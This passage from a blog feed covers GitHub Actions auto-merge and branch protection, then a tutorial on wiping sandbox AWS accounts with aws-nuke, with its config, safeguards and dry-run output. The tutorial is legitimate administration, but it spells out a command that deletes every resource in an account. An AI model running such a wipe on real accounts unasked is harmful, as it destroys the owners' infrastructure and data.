<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">steps</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">      - </span><span style="color: #8DDB8C">name</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">"Get information about the current run"</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">uses</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">potiuk/get-workflow-origin@v1_5</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">id</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">workflow-run-info</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">with</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">          </span><span style="color: #8DDB8C">token</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">${{ secrets.GITHUB_TOKEN }}</span></span>
<span data-line=""><span style="color: #ADBAC7">          </span><span style="color: #8DDB8C">sourceRunId</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">${{ github.event.workflow_run.id }}</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #ADBAC7">      - </span><span style="color: #8DDB8C">name</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">merge a pull request after terraform apply</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">uses</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">sudo-bot/action-pull-request-merge@v1.2.0</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">with</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">            </span><span style="color: #8DDB8C">github-token</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">${{ secrets.GITHUB_TOKEN }}</span></span>
<span data-line=""><span style="color: #ADBAC7">            </span><span style="color: #8DDB8C">number</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">${{ steps.workflow-run-info.outputs.pullRequestNumber }}</span></span></code></pre></div>
<p>This will wait until the <code>pr_apply</code> job completes and as long as it was
successful it'll merge the branch!</p>
<p><strong>NOTE</strong>: As I mentioned earlier, the event based actions do not run in the
context of the pull request which means you cannot test changes to them during
the PR either.  You must merge the <code>on-apply-finished.yml</code> file to <code>main</code>
before it starts working.</p>
<h1>Branch Protection</h1>
<p>The final step to the process is to make sure you go to your github settings
and make sure these status checks are required before merging. Branch protection
is a feature that will prevent merging changes into a branch unless all
required checks are passing.</p>
<p>Go to <code>Settings</code> -> <code>Branches</code> -> <code>Branch Protection</code> and add a branch
protection rule:</p>
<center>
<img src="/images/posts/aws_apply_before_merge/branch_protection.png" width="500">
</center>
<p>You want to enable the following settings:</p>
<ul>
<li><strong>Branch Name</strong>: main</li>
<li>✅ Require a pull request before merging</li>
<li>✅ Require status checks to pass before merging</li>
</ul>
<p>Then for <code>Status checks that are required.</code> select all of the ones we've
created:</p>
<center>
<img src="/images/posts/aws_apply_before_merge/required_checks.png" height="200">
</center>
<h1>Helpful Resources</h1>
<ul>
<li><a href="https://developer.hashicorp.com/terraform/tutorials/cloud/dynamic-credentials?product_intent=terraform">Terraform Dynamic Credentials Tutorial</a></li>
<li><a href="https://developer.hashicorp.com/terraform/cloud-docs/workspaces/dynamic-provider-credentials/aws-configuration">Terraform docs on Dynamic Credentials</a></li>
<li><a href="https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect#understanding-the-oidc-token">Github's understanding OIDC</a></li>
</ul>]]></description>
            <link>https://sontek.net/blog/2023/aws_from_scratch_apply_before_merge</link>
            <guid isPermaLink="true">https://sontek.net/blog/2023/aws_from_scratch_apply_before_merge</guid>
            <pubDate>Fri, 23 Jun 2023 00:00:00 GMT</pubDate>
        </item>
        <item>
            <title><![CDATA[Wiping an AWS Account with aws-nuke]]></title>
            <description><![CDATA[<p>When you're an SRE/DevOps engineer you'll end up making AWS accounts and
create a lot of cruft in your sandbox and development accounts. AWS
does not make it easy to clear these up but there is a tool called
<a href="https://github.com/rebuy-de/aws-nuke">aws-nuke</a> that will do it for you!</p>
<h1>Safe Guards</h1>
<p>aws-nuke has a few safeguards in place to prevent inadvertent data loss.
The first of which is it requires you to alias the targetted account. I
like to put <code>nuke</code> in the alias to make it clear.</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">aws</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">iam</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">create-account-alias</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--account-alias</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">nuke-</span><span style="color: #F47067">&#x3C;</span><span style="color: #96D0FF">accoun</span><span style="color: #ADBAC7">t</span><span style="color: #F47067">></span></span></code></pre></div>
<p>The second safe-guard is the config takes a key called <code>account-blocklist</code>
that will guarantee nuke will not run against it no matter what.</p>
<p>The final safety switch it has is it will not take any action by default,
it will only execute a dry-run.   You need to run the CLI with
<code>--no-dry-run</code> if you want it to take action.</p>
<h1>Getting Started</h1>
<p>You configure <code>aws-nuke</code> with YAML, so the first step is to define that:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">regions:</span></span>
<span data-line=""><span style="color: #adbac7">  - us-east-1</span></span>
<span data-line=""><span style="color: #adbac7">  - global</span></span>
<span data-line=""><span style="color: #adbac7"></span></span>
<span data-line=""><span style="color: #adbac7">account-blocklist:</span></span>
<span data-line=""><span style="color: #adbac7">  - "888888888888" # production</span></span>
<span data-line=""><span style="color: #adbac7"></span></span>
<span data-line=""><span style="color: #adbac7">accounts:</span></span>
<span data-line=""><span style="color: #adbac7">  "777777777777": {} # nuke-&#x3C;account></span></span></code></pre></div>
<p>This will prevent us from nuking our production account and target all resources
in the account we actually want to nuke.</p>
<p>You might want to have it nuke <em>ALL REGIONS</em> in AWS since you may not know which
regions resources are deployed in.   To do this you can query the regions from AWS:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">aws</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">ec2</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">describe-regions</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--all-regions</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--query</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"Regions[*].RegionName"</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--output</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">text</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7"> </span><span style="color: #F69D50">xargs</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-n</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">1</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7"> </span><span style="color: #F69D50">sort</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">af-south-1</span></span>
<span data-line=""><span style="color: #F69D50">ap-east-1</span></span>
<span data-line=""><span style="color: #F69D50">ap-northeast-1</span></span>
<span data-line=""><span style="color: #F69D50">ap-northeast-2</span></span>
<span data-line=""><span style="color: #F69D50">ap-northeast-3</span></span>
<span data-line=""><span style="color: #F69D50">ap-south-1</span></span>
<span data-line=""><span style="color: #F69D50">ap-south-2</span></span>
<span data-line=""><span style="color: #F69D50">ap-southeast-1</span></span>
<span data-line=""><span style="color: #F69D50">ap-southeast-2</span></span>
<span data-line=""><span style="color: #F69D50">ap-southeast-3</span></span>
<span data-line=""><span style="color: #F69D50">ap-southeast-4</span></span>
<span data-line=""><span style="color: #F69D50">ca-central-1</span></span>
<span data-line=""><span style="color: #F69D50">eu-central-1</span></span>
<span data-line=""><span style="color: #F69D50">eu-central-2</span></span>
<span data-line=""><span style="color: #F69D50">eu-north-1</span></span>
<span data-line=""><span style="color: #F69D50">eu-south-1</span></span>
<span data-line=""><span style="color: #F69D50">eu-south-2</span></span>
<span data-line=""><span style="color: #F69D50">eu-west-1</span></span>
<span data-line=""><span style="color: #F69D50">eu-west-2</span></span>
<span data-line=""><span style="color: #F69D50">eu-west-3</span></span>
<span data-line=""><span style="color: #F69D50">me-central-1</span></span>
<span data-line=""><span style="color: #F69D50">me-south-1</span></span>
<span data-line=""><span style="color: #F69D50">sa-east-1</span></span>
<span data-line=""><span style="color: #F69D50">us-east-1</span></span>
<span data-line=""><span style="color: #F69D50">us-east-2</span></span>
<span data-line=""><span style="color: #F69D50">us-west-1</span></span>
<span data-line=""><span style="color: #F69D50">us-west-2</span></span></code></pre></div>
<p>Which would give you an updated config of:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="yaml" data-theme="default"><code data-language="yaml" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #8DDB8C">regions</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">  - </span><span style="color: #96D0FF">global</span><span style="color: #ADBAC7">  </span><span style="color: #768390"># Global resources like IAM</span></span>
<span data-line=""><span style="color: #ADBAC7">  - </span><span style="color: #96D0FF">af-south-1</span></span>
<span data-line=""><span style="color: #ADBAC7">  - </span><span style="color: #96D0FF">ap-east-1</span></span>
<span data-line=""><span style="color: #ADBAC7">  - </span><span style="color: #96D0FF">ap-northeast-1</span></span>
<span data-line=""><span style="color: #ADBAC7">  - </span><span style="color: #96D0FF">ap-northeast-2</span></span>
<span data-line=""><span style="color: #ADBAC7">  - </span><span style="color: #96D0FF">ap-northeast-3</span></span>
<span data-line=""><span style="color: #ADBAC7">  - </span><span style="color: #96D0FF">ap-south-1</span></span>
<span data-line=""><span style="color: #ADBAC7">  - </span><span style="color: #96D0FF">ap-south-2</span></span>
<span data-line=""><span style="color: #ADBAC7">  - </span><span style="color: #96D0FF">ap-southeast-1</span></span>
<span data-line=""><span style="color: #ADBAC7">  - </span><span style="color: #96D0FF">ap-southeast-2</span></span>
<span data-line=""><span style="color: #ADBAC7">  - </span><span style="color: #96D0FF">ap-southeast-3</span></span>
<span data-line=""><span style="color: #ADBAC7">  - </span><span style="color: #96D0FF">ap-southeast-4</span></span>
<span data-line=""><span style="color: #ADBAC7">  - </span><span style="color: #96D0FF">ca-central-1</span></span>
<span data-line=""><span style="color: #ADBAC7">  - </span><span style="color: #96D0FF">eu-central-1</span></span>
<span data-line=""><span style="color: #ADBAC7">  - </span><span style="color: #96D0FF">eu-central-2</span></span>
<span data-line=""><span style="color: #ADBAC7">  - </span><span style="color: #96D0FF">eu-north-1</span></span>
<span data-line=""><span style="color: #ADBAC7">  - </span><span style="color: #96D0FF">eu-south-1</span></span>
<span data-line=""><span style="color: #ADBAC7">  - </span><span style="color: #96D0FF">eu-south-2</span></span>
<span data-line=""><span style="color: #ADBAC7">  - </span><span style="color: #96D0FF">eu-west-1</span></span>
<span data-line=""><span style="color: #ADBAC7">  - </span><span style="color: #96D0FF">eu-west-2</span></span>
<span data-line=""><span style="color: #ADBAC7">  - </span><span style="color: #96D0FF">eu-west-3</span></span>
<span data-line=""><span style="color: #ADBAC7">  - </span><span style="color: #96D0FF">me-central-1</span></span>
<span data-line=""><span style="color: #ADBAC7">  - </span><span style="color: #96D0FF">me-south-1</span></span>
<span data-line=""><span style="color: #ADBAC7">  - </span><span style="color: #96D0FF">sa-east-1</span></span>
<span data-line=""><span style="color: #ADBAC7">  - </span><span style="color: #96D0FF">us-east-1</span></span>
<span data-line=""><span style="color: #ADBAC7">  - </span><span style="color: #96D0FF">us-east-2</span></span>
<span data-line=""><span style="color: #ADBAC7">  - </span><span style="color: #96D0FF">us-west-1</span></span>
<span data-line=""><span style="color: #ADBAC7">  - </span><span style="color: #96D0FF">us-west-2</span></span></code></pre></div>
<p>I personally don't recommend targetting all AWS regions at the same time.  It
will generate a lot of output and be slow.  You could do it if necessary but
most people only have a few regions they use and so they can set those directly.
For example it, maybe you only use <code>us-</code> based regions?</p>
<p>So lets run the dry-run and see what it wants to nuke:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">aws-nuke</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-c</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">nuke.yaml</span></span></code></pre></div>
<p>This should output something like:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">Do</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">you</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">really</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">want</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">to</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">nuke</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">the</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">account</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">with</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">the</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">ID</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">777777777777</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">and</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">the</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">alias</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">'nuke-sandbox'?</span></span>
<span data-line=""><span style="color: #F69D50">Do</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">you</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">want</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">to</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">continue?</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Enter</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">account</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">alias</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">to</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">continue.</span></span>
<span data-line=""><span style="color: #F47067">></span><span style="color: #ADBAC7"> nuke-sandbox</span></span>
<span data-line=""><span style="color: #F69D50">us-east-1</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">EC2Subnet</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">subnet-0cd9975a443a6304b</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> [DefaultForAz: </span><span style="color: #96D0FF">"true",</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">DefaultVPC:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"true",</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">OwnerID:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"777777777777"]</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">would</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">remove</span></span>
<span data-line=""><span style="color: #F69D50">us-east-1</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">EC2Subnet</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">subnet-0be39d02e399a371c</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> [DefaultForAz: </span><span style="color: #96D0FF">"true",</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">DefaultVPC:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"true",</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">OwnerID:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"777777777777"]</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">would</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">remove</span></span>
<span data-line=""><span style="color: #F69D50">us-east-1</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">EC2Subnet</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">subnet-02d7017bd4730ea63</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> [DefaultForAz: </span><span style="color: #96D0FF">"true",</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">DefaultVPC:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"true",</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">OwnerID:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"777777777777"]</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">would</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">remove</span></span>
<span data-line=""><span style="color: #F69D50">us-east-1</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">EC2Subnet</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">subnet-0ec04b28c32708ab2</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> [DefaultForAz: </span><span style="color: #96D0FF">"true",</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">DefaultVPC:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"true",</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">OwnerID:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"777777777777"]</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">would</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">remove</span></span>
<span data-line=""><span style="color: #F69D50">us-east-1</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">EC2Subnet</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">subnet-0eea1b4be084840ed</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> [DefaultForAz: </span><span style="color: #96D0FF">"true",</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">DefaultVPC:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"true",</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">OwnerID:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"777777777777"]</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">would</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">remove</span></span>
<span data-line=""><span style="color: #F69D50">us-east-1</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">EC2Subnet</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">subnet-05a294cc04736012e</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> [DefaultForAz: </span><span style="color: #96D0FF">"true",</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">DefaultVPC:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"true",</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">OwnerID:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"777777777777"]</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">would</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">remove</span></span>
<span data-line=""><span style="color: #F69D50">us-east-1</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">EC2RouteTable</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">rtb-0abda0e94015064ca</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> [DefaultVPC: </span><span style="color: #96D0FF">"true"]</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">would</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">remove</span></span>
<span data-line=""><span style="color: #F69D50">us-east-1</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">EC2DefaultSecurityGroupRule</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sgr-0368525f77bf566ac</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> [SecurityGroupId: </span><span style="color: #96D0FF">"sg-0a59900b52ced5e10"]</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">would</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">remove</span></span>
<span data-line=""><span style="color: #F69D50">us-east-1</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">EC2DefaultSecurityGroupRule</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sgr-0890a837ed6148729</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> [SecurityGroupId: </span><span style="color: #96D0FF">"sg-0a59900b52ced5e10"]</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">would</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">remove</span></span>
<span data-line=""><span style="color: #F69D50">us-east-1</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">EC2InternetGatewayAttachment</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">igw-0acfb474f1fd71375</span><span style="color: #ADBAC7"> -</span><span style="color: #F47067">></span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">vpc-0be5d310ab44c239a</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> [DefaultVPC: </span><span style="color: #96D0FF">"true"]</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">would</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">remove</span></span>
<span data-line=""><span style="color: #F69D50">us-east-1</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">SQSQueue</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">https://sqs.us-east-1.amazonaws.com/777777777777/example-sqs</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">would</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">remove</span></span>
<span data-line=""><span style="color: #F69D50">global</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">IAMSAMLProvider</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">arn:aws:iam::777777777777:saml-provider/AWSSSO_254abb4071f10b25_DO_NOT_DELETE</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">would</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">remove</span></span>
<span data-line=""><span style="color: #F69D50">global</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">IAMOpenIDConnectProvider</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">arn:aws:iam::777777777777:oidc-provider/app.terraform.io</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> [Arn: </span><span style="color: #96D0FF">"arn:aws:iam::777777777777:oidc-provider/app.terraform.io"]</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">would</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">remove</span></span>
<span data-line=""><span style="color: #F69D50">global</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">IAMPolicy</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">arn:aws:iam::777777777777:policy/tfc-agent-access-policy</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> [ARN: </span><span style="color: #96D0FF">"arn:aws:iam::777777777777:policy/tfc-agent-access-policy",</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Name:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"tfc-agent-access-policy",</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Path:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"/",</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">PolicyID:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"ANPA2T6PZOBNWI76TKQRF"]</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">would</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">remove</span></span>
<span data-line=""><span style="color: #F69D50">global</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">IAMRole</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">tfc-agent</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> [CreateDate: </span><span style="color: #96D0FF">"2023-04-02T17:55:23Z",</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">LastUsedDate:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"2023-06-22T13:45:02Z",</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Name:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"tfc-agent",</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Path:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"/"]</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">would</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">remove</span></span>
